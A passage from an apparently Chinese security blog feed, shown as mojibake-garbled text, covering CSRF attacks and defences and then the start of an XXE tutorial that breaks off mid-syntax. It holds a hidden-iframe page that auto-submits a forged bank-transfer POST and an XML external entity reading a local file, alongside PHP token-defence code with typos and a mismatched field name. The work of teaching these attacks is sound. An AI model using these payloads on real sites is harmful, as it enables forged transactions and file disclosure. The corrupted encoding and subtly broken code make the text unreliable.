å†æ¬¡æ²¡äº†1000å—ï½žT_Tï¼Œè¿™æ¬¡äº‹æ•…çš„åŽŸå› æ˜¯ï¼šé“¶è¡ŒåŽå°ä½¿ç”¨äº†$_REQUESTåŽ»èŽ·å–è¯·æ±‚çš„æ•°æ®ï¼Œè€Œ$_REQUESTæ—¢å¯ä»¥èŽ·å–GETè¯·æ±‚çš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥èŽ·å–POSTè¯·æ±‚çš„æ•°æ®ï¼Œè¿™å°±é€ æˆäº†åœ¨åŽå°å¤„ç†ç¨‹åºæ— æ³•åŒºåˆ†è¿™åˆ°åº•æ˜¯GETè¯·æ±‚çš„æ•°æ®è¿˜æ˜¯POSTè¯·æ±‚çš„æ•°æ®ã€‚åœ¨PHPä¸­ï¼Œå¯ä»¥ä½¿ç”¨$_GETå’Œ$_POSTåˆ†åˆ«èŽ·å–GETè¯·æ±‚å’ŒPOSTè¯·æ±‚çš„æ•°æ®ã€‚åœ¨JAVAä¸­ï¼Œç”¨äºŽèŽ·å–è¯·æ±‚æ•°æ®requestä¸€æ ·å­˜åœ¨ä¸èƒ½åŒºåˆ†GETè¯·æ±‚æ•°æ®å’ŒPOSTæ•°æ®çš„é—®é¢˜ã€‚</p><p>ã€€ã€€<strong>ç¤ºä¾‹3ï¼š</strong></p><p>ã€€ã€€ç»è¿‡å‰é¢2ä¸ªæƒ¨ç—›çš„æ•™è®­ï¼Œé“¶è¡Œå†³å®šæŠŠèŽ·å–è¯·æ±‚æ•°æ®çš„æ–¹æ³•ä¹Ÿæ”¹äº†ï¼Œæ”¹ç”¨$_POSTï¼ŒåªèŽ·å–POSTè¯·æ±‚çš„æ•°æ®ï¼ŒåŽå°å¤„ç†é¡µé¢Transfer.phpä»£ç å¦‚ä¸‹ï¼š</p><pre><code>ã€€ã€€&lt;?phpã€€ã€€ã€€ã€€session_start();ã€€ã€€ã€€ã€€if (isset($_POST['toBankId'] &amp;&amp;ã€€isset($_POST['money']))ã€€ã€€ã€€ã€€{ã€€ã€€ã€€ã€€  buy_stocks($_POST['toBankId'],ã€€$_POST['money']);ã€€ã€€ã€€ã€€}ã€€ã€€?&gt;</code></pre><p>ã€€ã€€ç„¶è€Œï¼Œå±é™©ç½‘ç«™Bä¸Žæ—¶ä¿±è¿›ï¼Œå®ƒæ”¹äº†ä¸€ä¸‹ä»£ç ï¼š</p><pre><code>&lt;html&gt;ã€€ã€€&lt;head&gt;&lt;script type="text/javascript"&gt;ã€€ã€€ã€€ã€€ã€€ã€€function steal()ã€€ã€€ã€€ã€€ã€€ã€€{     ã€€ã€€ã€€ã€€ iframe = document.frames["steal"];ã€€ã€€   ã€€   iframe.document.Submit("transfer");ã€€ã€€ã€€ã€€ã€€ã€€}ã€€ã€€ã€€ã€€&lt;/script&gt;ã€€ã€€&lt;/head&gt;ã€€ã€€&lt;body onload="steal()"&gt;ã€€ã€€ã€€ã€€&lt;iframe name="steal" display="none"&gt;ã€€ã€€ã€€ã€€ã€€ã€€&lt;form method="POST" name="transfer"ã€€action="http://www.myBank.com/Transfer.php"&gt;ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€&lt;input type="hidden" name="toBankId" value="11"&gt;ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€&lt;input type="hidden" name="money" value="1000"&gt;ã€€ã€€ã€€ã€€ã€€ã€€&lt;/form&gt;ã€€ã€€ã€€ã€€&lt;/iframe&gt;ã€€ã€€&lt;/body&gt;ã€€ã€€&lt;/html&gt;</code></pre><p>å¦‚æžœç”¨æˆ·ä»æ˜¯ç»§ç»­ä¸Šé¢çš„æ“ä½œï¼Œå¾ˆä¸å¹¸ï¼Œç»“æžœå°†ä¼šæ˜¯å†æ¬¡ä¸è§1000å—â€¦â€¦å› ä¸ºè¿™é‡Œå±é™©ç½‘ç«™Bæš—åœ°é‡Œå‘é€äº†POSTè¯·æ±‚åˆ°é“¶è¡Œ!</p><p>ã€€ã€€æ€»ç»“ä¸€ä¸‹ä¸Šé¢3ä¸ªä¾‹å­ï¼ŒCSRFä¸»è¦çš„æ”»å‡»æ¨¡å¼åŸºæœ¬ä¸Šæ˜¯ä»¥ä¸Šçš„3ç§ï¼Œå…¶ä¸­ä»¥ç¬¬1,2ç§æœ€ä¸ºä¸¥é‡ï¼Œå› ä¸ºè§¦å‘æ¡ä»¶å¾ˆç®€å•ï¼Œä¸€ä¸ª<img>å°±å¯ä»¥äº†ï¼Œè€Œç¬¬3ç§æ¯”è¾ƒéº»çƒ¦ï¼Œéœ€è¦ä½¿ç”¨JavaScriptï¼Œæ‰€ä»¥ä½¿ç”¨çš„æœºä¼šä¼šæ¯”å‰é¢çš„å°‘å¾ˆå¤šï¼Œä½†æ— è®ºæ˜¯å“ªç§æƒ…å†µï¼Œåªè¦è§¦å‘äº†CSRFæ”»å‡»ï¼ŒåŽæžœéƒ½æœ‰å¯èƒ½å¾ˆä¸¥é‡ã€‚</p><p>ã€€ã€€ç†è§£ä¸Šé¢çš„3ç§æ”»å‡»æ¨¡å¼ï¼Œå…¶å®žå¯ä»¥çœ‹å‡ºï¼ŒCSRFæ”»å‡»æ˜¯æºäºŽWEBçš„éšå¼èº«ä»½éªŒè¯æœºåˆ¶ï¼WEBçš„èº«ä»½éªŒè¯æœºåˆ¶è™½ç„¶å¯ä»¥ä¿è¯ä¸€ä¸ªè¯·æ±‚æ˜¯æ¥è‡ªäºŽæŸä¸ªç”¨æˆ·çš„æµè§ˆå™¨ï¼Œä½†å´æ— æ³•ä¿è¯è¯¥è¯·æ±‚æ˜¯ç”¨æˆ·æ‰¹å‡†å‘é€çš„ï¼</p><p><strong>äº”.CSRFçš„é˜²å¾¡</strong></p><p>ã€€ã€€æˆ‘æ€»ç»“äº†ä¸€ä¸‹çœ‹åˆ°çš„èµ„æ–™ï¼ŒCSRFçš„é˜²å¾¡å¯ä»¥ä»ŽæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¸¤æ–¹é¢ç€æ‰‹ï¼Œé˜²å¾¡æ•ˆæžœæ˜¯ä»ŽæœåŠ¡ç«¯ç€æ‰‹æ•ˆæžœæ¯”è¾ƒå¥½ï¼ŒçŽ°åœ¨ä¸€èˆ¬çš„CSRFé˜²å¾¡ä¹Ÿéƒ½åœ¨æœåŠ¡ç«¯è¿›è¡Œã€‚</p><p>ã€€ã€€<strong>1.æœåŠ¡ç«¯è¿›è¡ŒCSRFé˜²å¾¡</strong></p><p>ã€€ã€€æœåŠ¡ç«¯çš„CSRFæ–¹å¼æ–¹æ³•å¾ˆå¤šæ ·ï¼Œä½†æ€»çš„æ€æƒ³éƒ½æ˜¯ä¸€è‡´çš„ï¼Œå°±æ˜¯åœ¨å®¢æˆ·ç«¯é¡µé¢å¢žåŠ ä¼ªéšæœºæ•°ã€‚</p><p>ã€€ã€€(1).Cookie Hashing(æ‰€æœ‰è¡¨å•éƒ½åŒ…å«åŒä¸€ä¸ªä¼ªéšæœºå€¼)ï¼š</p><p>ã€€ã€€è¿™å¯èƒ½æ˜¯æœ€ç®€å•çš„è§£å†³æ–¹æ¡ˆäº†ï¼Œå› ä¸ºæ”»å‡»è€…ä¸èƒ½èŽ·å¾—ç¬¬ä¸‰æ–¹çš„Cookie(ç†è®ºä¸Š)ï¼Œæ‰€ä»¥è¡¨å•ä¸­çš„æ•°æ®ä¹Ÿå°±æž„é€ å¤±è´¥äº†:&gt;</p><p>ã€€ã€€<!--?phpã€€ã€€ã€€ã€€//æž„é€ åŠ å¯†çš„Cookieä¿¡æ¯ã€€ã€€ã€€ã€€$value = â€œDefenseSCRFâ€;ã€€ã€€ã€€ã€€setcookie(â€cookieâ€, $value, time()+3600);ã€€ã€€?--></p><p>ã€€ã€€åœ¨è¡¨å•é‡Œå¢žåŠ Hashå€¼ï¼Œä»¥è®¤è¯è¿™ç¡®å®žæ˜¯ç”¨æˆ·å‘é€çš„è¯·æ±‚ã€‚</p><pre><code>ã€€&lt;?phpã€€ã€€ã€€ã€€$hash = md5($_COOKIE['cookie']);ã€€ã€€?&gt;ã€€ã€€&lt;form method="POST" action="transfer.php"&gt;ã€€ã€€ã€€ã€€&lt;input type="text" name="toBankId"&gt;ã€€ã€€ã€€ã€€&lt;input type="text" name="money"&gt;ã€€ã€€ã€€ã€€&lt;input type=â€hiddenâ€ name=â€hashâ€ value=â€&lt;?=$hash;?&gt;â€&gt;ã€€ã€€ã€€ã€€&lt;input type="submit" name="submit" value="Submit"&gt;ã€€ã€€&lt;/form&gt;</code></pre><p>ã€€ã€€ç„¶åŽåœ¨æœåŠ¡å™¨ç«¯è¿›è¡ŒHashå€¼éªŒè¯</p><pre><code>  &lt;?phpã€€ã€€   if(isset($_POST['check'])) {   ã€€   $hash = md5($_COOKIE['cookie']);     ã€€ã€€ if($_POST['check'] == $hash) {        ã€€ doJob();ã€€ã€€      } else {ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€//...     ã€€ã€€ }ã€€ã€€   } else {ã€€ã€€ã€€ã€€ã€€ã€€//...ã€€ã€€   }   ?&gt;</code></pre><p>ã€€ã€€è¿™ä¸ªæ–¹æ³•ä¸ªäººè§‰å¾—å·²ç»å¯ä»¥æœç»99%çš„CSRFæ”»å‡»äº†ï¼Œé‚£è¿˜æœ‰1%å‘¢â€¦.ç”±äºŽç”¨æˆ·çš„Cookieå¾ˆå®¹æ˜“ç”±äºŽç½‘ç«™çš„XSSæ¼æ´žè€Œè¢«ç›—å–ï¼Œè¿™å°±å¦å¤–çš„1%ã€‚ä¸€èˆ¬çš„æ”»å‡»è€…çœ‹åˆ°æœ‰éœ€è¦ç®—Hashå€¼ï¼ŒåŸºæœ¬éƒ½ä¼šæ”¾å¼ƒäº†ï¼ŒæŸäº›é™¤å¤–ï¼Œæ‰€ä»¥å¦‚æžœéœ€è¦100%çš„æœç»ï¼Œè¿™ä¸ªä¸æ˜¯æœ€å¥½çš„æ–¹æ³•ã€‚<br>ã€€ã€€(2).éªŒè¯ç </p><p>ã€€ã€€è¿™ä¸ªæ–¹æ¡ˆçš„æ€è·¯æ˜¯ï¼šæ¯æ¬¡çš„ç”¨æˆ·æäº¤éƒ½éœ€è¦ç”¨æˆ·åœ¨è¡¨å•ä¸­å¡«å†™ä¸€ä¸ªå›¾ç‰‡ä¸Šçš„éšæœºå­—ç¬¦ä¸²ï¼ŒåŽ„â€¦.è¿™ä¸ªæ–¹æ¡ˆå¯ä»¥å®Œå…¨è§£å†³CSRFï¼Œä½†ä¸ªäººè§‰å¾—åœ¨æ˜“ç”¨æ€§æ–¹é¢ä¼¼ä¹Žä¸æ˜¯å¤ªå¥½ï¼Œè¿˜æœ‰å¬é—»æ˜¯éªŒè¯ç å›¾ç‰‡çš„ä½¿ç”¨æ¶‰åŠäº†ä¸€ä¸ªè¢«ç§°ä¸ºMHTMLçš„Bugï¼Œå¯èƒ½åœ¨æŸäº›ç‰ˆæœ¬çš„å¾®è½¯IEä¸­å—å½±å“ã€‚</p><p>ã€€ã€€(3).One-Time Tokens(ä¸åŒçš„è¡¨å•åŒ…å«ä¸€ä¸ªä¸åŒçš„ä¼ªéšæœºå€¼)</p><p>ã€€ã€€åœ¨å®žçŽ°One-Time  Tokensæ—¶ï¼Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼šå°±æ˜¯â€œå¹¶è¡Œä¼šè¯çš„å…¼å®¹â€ã€‚å¦‚æžœç”¨æˆ·åœ¨ä¸€ä¸ªç«™ç‚¹ä¸ŠåŒæ—¶æ‰“å¼€äº†ä¸¤ä¸ªä¸åŒçš„è¡¨å•ï¼ŒCSRFä¿æŠ¤æŽªæ–½ä¸åº”è¯¥å½±å“åˆ°ä»–å¯¹ä»»ä½•è¡¨å•çš„æäº¤ã€‚è€ƒè™‘ä¸€ä¸‹å¦‚æžœæ¯æ¬¡è¡¨å•è¢«è£…å…¥æ—¶ç«™ç‚¹ç”Ÿæˆä¸€ä¸ªä¼ªéšæœºå€¼æ¥è¦†ç›–ä»¥å‰çš„ä¼ªéšæœºå€¼å°†ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼šç”¨æˆ·åªèƒ½æˆåŠŸåœ°æäº¤ä»–æœ€åŽæ‰“å¼€çš„è¡¨å•ï¼Œå› ä¸ºæ‰€æœ‰å…¶ä»–çš„è¡¨å•éƒ½å«æœ‰éžæ³•çš„ä¼ªéšæœºå€¼ã€‚å¿…é¡»å°å¿ƒæ“ä½œä»¥ç¡®ä¿CSRFä¿æŠ¤æŽªæ–½ä¸ä¼šå½±å“é€‰é¡¹å¡å¼çš„æµè§ˆæˆ–è€…åˆ©ç”¨å¤šä¸ªæµè§ˆå™¨çª—å£æµè§ˆä¸€ä¸ªç«™ç‚¹ã€‚</p><p>ã€€ã€€ä»¥ä¸‹æˆ‘çš„å®žçŽ°:</p><p>ã€€ã€€1).å…ˆæ˜¯ä»¤ç‰Œç”Ÿæˆå‡½æ•°(gen_token())ï¼š</p><pre><code> &lt;?php   function gen_token() { ã€€ã€€ã€€ã€€//è¿™é‡Œæˆ‘æ˜¯è´ªæ–¹ä¾¿ï¼Œå®žé™…ä¸Šå•ä½¿ç”¨Rand()å¾—å‡ºçš„éšæœºæ•°ä½œä¸ºä»¤ç‰Œï¼Œä¹Ÿæ˜¯ä¸å®‰å…¨çš„ã€‚ã€€ã€€ã€€ã€€//è¿™ä¸ªå¯ä»¥å‚è€ƒæˆ‘å†™çš„Findbugsç¬”è®°ä¸­çš„[ã€ŠRandom object created and used only onceã€‹](https://www.cnblogs.com/hyddd/articles/1391737.html)     $token = md5(uniqid(rand(), true));     return $token;   }</code></pre><p>ã€€ã€€2).ç„¶åŽæ˜¯Sessionä»¤ç‰Œç”Ÿæˆå‡½æ•°(gen_stoken())ï¼š</p><pre><code>   &lt;?php   ã€€function gen_stoken() {$pToken = "";ã€€ã€€ã€€ã€€ã€€ã€€if($_SESSION[STOKEN_NAME] == $pToken){ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€//æ²¡æœ‰å€¼ï¼Œèµ‹æ–°å€¼ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€$_SESSION[STOKEN_NAME] = gen_token();ã€€ã€€ã€€ã€€ã€€ã€€}  ã€€ã€€ã€€ã€€ã€€ã€€else{ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€//ç»§ç»­ä½¿ç”¨æ—§çš„å€¼ã€€ã€€ã€€ã€€ã€€ã€€}   ã€€}   ?&gt;</code></pre><p>ã€€ã€€3).WEBè¡¨å•ç”Ÿæˆéšè—è¾“å…¥åŸŸçš„å‡½æ•°ï¼šã€€ã€€</p><pre><code>&lt;?phpã€€ã€€   function gen_input() {   ã€€   gen_stoken();ã€€ã€€     echo â€œ&lt;input type=\â€hidden\â€ name=\â€" . FTOKEN_NAME . â€œ\â€     ã€€ã€€   value=\â€" . $_SESSION[STOKEN_NAME] . â€œ\â€&gt; â€œ;   ã€€ã€€}   ?&gt;</code></pre><p>ã€€ã€€4).WEBè¡¨å•ç»“æž„ï¼š</p><pre><code>&lt;?php     session_start();     include(â€functions.phpâ€);   ?&gt;   &lt;form method="POST" action="transfer.php"&gt;     &lt;input type="text" name="toBankId"&gt;     &lt;input type="text" name="money"&gt;     &lt;? gen_input(); ?&gt;     &lt;input type="submit" name="submit" value="Submit"&gt;   &lt;/FORM&gt;</code></pre><p>ã€€ã€€5).æœåŠ¡ç«¯æ ¸å¯¹ä»¤ç‰Œï¼š</p><p>ã€€ã€€è¿™ä¸ªå¾ˆç®€å•ï¼Œè¿™é‡Œå°±ä¸å†å•°å—¦äº†ã€‚</p><p>ã€€ã€€ä¸Šé¢è¿™ä¸ªå…¶å®žä¸å®Œå…¨ç¬¦åˆâ€œå¹¶è¡Œä¼šè¯çš„å…¼å®¹â€çš„è§„åˆ™ï¼Œå¤§å®¶å¯ä»¥åœ¨æ­¤åŸºç¡€ä¸Šä¿®æ”¹ã€‚</p><p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:XXEæ¼æ´ž</title>
      <link href="2021/05/26/web-xxe-lou-dong/"/>
      <url>2021/05/26/web-xxe-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€XXE-æ˜¯ä»€ä¹ˆ"><a href="#ä¸€ã€XXE-æ˜¯ä»€ä¹ˆ" class="headerlink" title="ä¸€ã€XXE æ˜¯ä»€ä¹ˆ"></a><strong>ä¸€ã€XXE æ˜¯ä»€ä¹ˆ</strong></h2><p>ä»‹ç» XXE ä¹‹å‰ï¼Œæˆ‘å…ˆæ¥è¯´ä¸€ä¸‹æ™®é€šçš„ XML æ³¨å…¥ï¼Œè¿™ä¸ªçš„åˆ©ç”¨é¢æ¯”è¾ƒç‹­çª„ï¼Œå¦‚æžœæœ‰çš„è¯åº”è¯¥ä¹Ÿæ˜¯é€»è¾‘æ¼æ´ž</p><p><strong>å¦‚å›¾æ‰€ç¤ºï¼š</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7aed0d2-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7aed0d2-ec17-1.png" alt="img"></a></p><p>æ—¢ç„¶èƒ½æ’å…¥ XML ä»£ç ï¼Œé‚£æˆ‘ä»¬è‚¯å®šä¸èƒ½å–„ç½¢ç”˜ä¼‘ï¼Œæˆ‘ä»¬éœ€è¦æ›´å¤šï¼ŒäºŽæ˜¯å‡ºçŽ°äº† XXE</p><p>XXE(XML External Entity Injection) å…¨ç§°ä¸º XML å¤–éƒ¨å®žä½“æ³¨å…¥ï¼Œä»Žåå­—å°±èƒ½çœ‹å‡ºæ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªæ³¨å…¥æ¼æ´žï¼Œæ³¨å…¥çš„æ˜¯ä»€ä¹ˆï¼ŸXMLå¤–éƒ¨å®žä½“ã€‚(çœ‹åˆ°è¿™é‡Œè‚¯å®šæœ‰äººè¦è¯´ï¼šä½ è¿™ä¸æ˜¯åœ¨åºŸè¯)ï¼Œå›ºç„¶ï¼Œå…¶å®žæˆ‘è¿™é‡ŒåºŸè¯åªæ˜¯æƒ³å¼ºè°ƒæˆ‘ä»¬çš„åˆ©ç”¨ç‚¹æ˜¯ <strong>å¤–éƒ¨å®žä½“</strong> ï¼Œä¹Ÿæ˜¯æé†’è¯»è€…å°†æ³¨æ„åŠ›é›†ä¸­äºŽå¤–éƒ¨å®žä½“ä¸­ï¼Œè€Œä¸è¦è¢« XML ä¸­å…¶ä»–çš„ä¸€äº›åå­—ç›¸ä¼¼çš„ä¸œè¥¿æ‰°ä¹±äº†æ€ç»´(<strong>ç›¯å¥½å¤–éƒ¨å®žä½“å°±è¡Œäº†</strong>)ï¼Œå¦‚æžœèƒ½æ³¨å…¥ å¤–éƒ¨å®žä½“å¹¶ä¸”æˆåŠŸè§£æžçš„è¯ï¼Œè¿™å°±ä¼šå¤§å¤§æ‹“å®½æˆ‘ä»¬ XML æ³¨å…¥çš„æ”»å‡»é¢ï¼ˆè¿™å¯èƒ½å°±æ˜¯ä¸ºä»€ä¹ˆå•ç‹¬è¯´ è€Œæ²¡æœ‰è¯´ XML æ³¨å…¥çš„åŽŸå› å§ï¼Œæˆ–è®¸æ™®é€šçš„ XML æ³¨å…¥çœŸçš„å¤ªé¸¡è‚‹äº†ï¼ŒçŽ°å®žä¸­å‡ ä¹Žç”¨ä¸åˆ°ï¼‰</p><h2 id="äºŒã€ç®€å•ä»‹ç»ä¸€ä¸‹èƒŒæ™¯çŸ¥è¯†ï¼š"><a href="#äºŒã€ç®€å•ä»‹ç»ä¸€ä¸‹èƒŒæ™¯çŸ¥è¯†ï¼š" class="headerlink" title="äºŒã€ç®€å•ä»‹ç»ä¸€ä¸‹èƒŒæ™¯çŸ¥è¯†ï¼š"></a><strong>äºŒã€ç®€å•ä»‹ç»ä¸€ä¸‹èƒŒæ™¯çŸ¥è¯†ï¼š</strong></h2><p>XMLæ˜¯ä¸€ç§éžå¸¸æµè¡Œçš„æ ‡è®°è¯­è¨€ï¼Œåœ¨1990å¹´ä»£åŽæœŸé¦–æ¬¡æ ‡å‡†åŒ–ï¼Œå¹¶è¢«æ— æ•°çš„è½¯ä»¶é¡¹ç›®æ‰€é‡‡ç”¨ã€‚å®ƒç”¨äºŽé…ç½®æ–‡ä»¶ï¼Œæ–‡æ¡£æ ¼å¼ï¼ˆå¦‚OOXMLï¼ŒODFï¼ŒPDFï¼ŒRSSï¼Œâ€¦ï¼‰ï¼Œå›¾åƒæ ¼å¼ï¼ˆSVGï¼ŒEXIFæ ‡é¢˜ï¼‰å’Œç½‘ç»œåè®®ï¼ˆWebDAVï¼ŒCalDAVï¼ŒXMLRPCï¼ŒSOAPï¼ŒXMPPï¼ŒSAMLï¼Œ XACMLï¼Œâ€¦ï¼‰ï¼Œä»–åº”ç”¨çš„å¦‚æ­¤çš„æ™®éä»¥è‡³äºŽä»–å‡ºçŽ°çš„ä»»ä½•é—®é¢˜éƒ½ä¼šå¸¦æ¥ç¾éš¾æ€§çš„ç»“æžœã€‚</p><p>åœ¨è§£æžå¤–éƒ¨å®žä½“çš„è¿‡ç¨‹ä¸­ï¼ŒXMLè§£æžå™¨å¯ä»¥æ ¹æ®URLä¸­æŒ‡å®šçš„æ–¹æ¡ˆï¼ˆåè®®ï¼‰æ¥æŸ¥è¯¢å„ç§ç½‘ç»œåè®®å’ŒæœåŠ¡ï¼ˆDNSï¼ŒFTPï¼ŒHTTPï¼ŒSMBç­‰ï¼‰ã€‚  å¤–éƒ¨å®žä½“å¯¹äºŽåœ¨æ–‡æ¡£ä¸­åˆ›å»ºåŠ¨æ€å¼•ç”¨éžå¸¸æœ‰ç”¨ï¼Œè¿™æ ·å¯¹å¼•ç”¨èµ„æºæ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½ä¼šåœ¨æ–‡æ¡£ä¸­è‡ªåŠ¨æ›´æ–°ã€‚  ä½†æ˜¯ï¼Œåœ¨å¤„ç†å¤–éƒ¨å®žä½“æ—¶ï¼Œå¯ä»¥é’ˆå¯¹åº”ç”¨ç¨‹åºå¯åŠ¨è®¸å¤šæ”»å‡»ã€‚  è¿™äº›æ”»å‡»åŒ…æ‹¬æ³„éœ²æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶å¯èƒ½åŒ…å«å¯†ç å’Œç§äººç”¨æˆ·æ•°æ®ç­‰æ•æ„Ÿæ•°æ®ï¼Œæˆ–åˆ©ç”¨å„ç§æ–¹æ¡ˆçš„ç½‘ç»œè®¿é—®åŠŸèƒ½æ¥æ“çºµå†…éƒ¨åº”ç”¨ç¨‹åºã€‚  é€šè¿‡å°†è¿™äº›æ”»å‡»ä¸Žå…¶ä»–å®žçŽ°ç¼ºé™·ç›¸ç»“åˆï¼Œè¿™äº›æ”»å‡»çš„èŒƒå›´å¯ä»¥æ‰©å±•åˆ°å®¢æˆ·ç«¯å†…å­˜æŸåï¼Œä»»æ„ä»£ç æ‰§è¡Œï¼Œç”šè‡³æœåŠ¡ä¸­æ–­ï¼Œå…·ä½“å–å†³äºŽè¿™äº›æ”»å‡»çš„ä¸Šä¸‹æ–‡ã€‚</p><h2 id="ä¸‰ã€åŸºç¡€çŸ¥è¯†"><a href="#ä¸‰ã€åŸºç¡€çŸ¥è¯†" class="headerlink" title="ä¸‰ã€åŸºç¡€çŸ¥è¯†"></a><strong>ä¸‰ã€åŸºç¡€çŸ¥è¯†</strong></h2><p>XML æ–‡æ¡£æœ‰è‡ªå·±çš„ä¸€ä¸ªæ ¼å¼è§„èŒƒï¼Œè¿™ä¸ªæ ¼å¼è§„èŒƒæ˜¯ç”±ä¸€ä¸ªå«åš DTDï¼ˆdocument type definitionï¼‰ çš„ä¸œè¥¿æŽ§åˆ¶çš„ï¼Œä»–å°±æ˜¯é•¿å¾—ä¸‹é¢è¿™ä¸ªæ ·å­</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>&lt;?xml version="1.0"?&gt;//è¿™ä¸€è¡Œæ˜¯ XML æ–‡æ¡£å®šä¹‰&lt;!DOCTYPE message [&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;&lt;!ELEMENT receiver (#PCDATA)&gt;&lt;!ELEMENT sender (#PCDATA)&gt;&lt;!ELEMENT header (#PCDATA)&gt;&lt;!ELEMENT msg (#PCDATA)&gt;</code></pre><p>ä¸Šé¢è¿™ä¸ª DTD å°±å®šä¹‰äº† XML çš„æ ¹å…ƒç´ æ˜¯ messageï¼Œç„¶åŽè·Ÿå…ƒç´ ä¸‹é¢æœ‰ä¸€äº›å­å…ƒç´ ï¼Œé‚£ä¹ˆ XML åˆ°æ—¶å€™å¿…é¡»åƒä¸‹é¢è¿™ä¹ˆå†™</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>&lt;message&gt;&lt;receiver&gt;Myself&lt;/receiver&gt;&lt;sender&gt;Someone&lt;/sender&gt;&lt;header&gt;TheReminder&lt;/header&gt;&lt;msg&gt;This is an amazing book&lt;/msg&gt;&lt;/message&gt;</code></pre><p>å…¶å®žé™¤äº†åœ¨ DTD ä¸­å®šä¹‰å…ƒç´ ï¼ˆå…¶å®žå°±æ˜¯å¯¹åº” XML ä¸­çš„æ ‡ç­¾ï¼‰ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½åœ¨ DTD ä¸­å®šä¹‰å®žä½“(å¯¹åº”XML æ ‡ç­¾ä¸­çš„å†…å®¹)ï¼Œæ¯•ç«Ÿ ML ä¸­é™¤äº†èƒ½æ ‡ç­¾ä»¥å¤–ï¼Œè¿˜éœ€è¦æœ‰äº›å†…å®¹æ˜¯å›ºå®šçš„</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe "test" &gt;]&gt;</code></pre><p>è¿™é‡Œ å®šä¹‰å…ƒç´ ä¸º ANY è¯´æ˜ŽæŽ¥å—ä»»ä½•å…ƒç´ ï¼Œä½†æ˜¯å®šä¹‰äº†ä¸€ä¸ª xml çš„å®žä½“ï¼ˆè¿™æ˜¯æˆ‘ä»¬åœ¨è¿™ç¯‡æ–‡ç« ä¸­ç¬¬ä¸€æ¬¡çœ‹åˆ°å®žä½“çš„çœŸé¢ç›®ï¼Œå®žä½“å…¶å®žå¯ä»¥çœ‹æˆä¸€ä¸ªå˜é‡ï¼Œåˆ°æ—¶å€™æˆ‘ä»¬å¯ä»¥åœ¨ XML ä¸­é€šè¿‡ &amp; ç¬¦å·è¿›è¡Œå¼•ç”¨ï¼‰ï¼Œé‚£ä¹ˆ XML å°±å¯ä»¥å†™æˆè¿™æ ·</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>æˆ‘ä»¬ä½¿ç”¨ &amp;xxe å¯¹ ä¸Šé¢å®šä¹‰çš„ xxe å®žä½“è¿›è¡Œäº†å¼•ç”¨ï¼Œåˆ°æ—¶å€™è¾“å‡ºçš„æ—¶å€™ &amp;xxe å°±ä¼šè¢« â€œtestâ€ æ›¿æ¢ã€‚</p><h3 id="é‡ç‚¹æ¥äº†ï¼š"><a href="#é‡ç‚¹æ¥äº†ï¼š" class="headerlink" title="é‡ç‚¹æ¥äº†ï¼š"></a><strong>é‡ç‚¹æ¥äº†ï¼š</strong></h3><p><strong>é‡ç‚¹ä¸€ï¼š</strong></p><p>å®žä½“åˆ†ä¸ºä¸¤ç§ï¼Œå†…éƒ¨å®žä½“å’Œ<strong>å¤–éƒ¨å®žä½“</strong>ï¼Œä¸Šé¢æˆ‘ä»¬ä¸¾çš„ä¾‹å­å°±æ˜¯å†…éƒ¨å®žä½“ï¼Œä½†æ˜¯å®žä½“å®žé™…ä¸Šå¯ä»¥ä»Žå¤–éƒ¨çš„ dtd æ–‡ä»¶ä¸­å¼•ç”¨ï¼Œæˆ‘ä»¬çœ‹ä¸‹é¢çš„ä»£ç ï¼š</p><p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p><pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///c:/test.dtd" &gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p>è¿™æ ·å¯¹å¼•ç”¨èµ„æºæ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½ä¼šåœ¨æ–‡æ¡£ä¸­è‡ªåŠ¨æ›´æ–°,éžå¸¸æ–¹ä¾¿ï¼ˆ<strong>æ–¹ä¾¿æ°¸è¿œæ˜¯å®‰å…¨çš„æ•Œäºº</strong>ï¼‰</p><p>å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç§å¼•ç”¨æ–¹å¼æ˜¯ä½¿ç”¨ å¼•ç”¨<strong>å…¬ç”¨ DTD</strong> çš„æ–¹æ³•ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p><pre><code>&lt;!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC 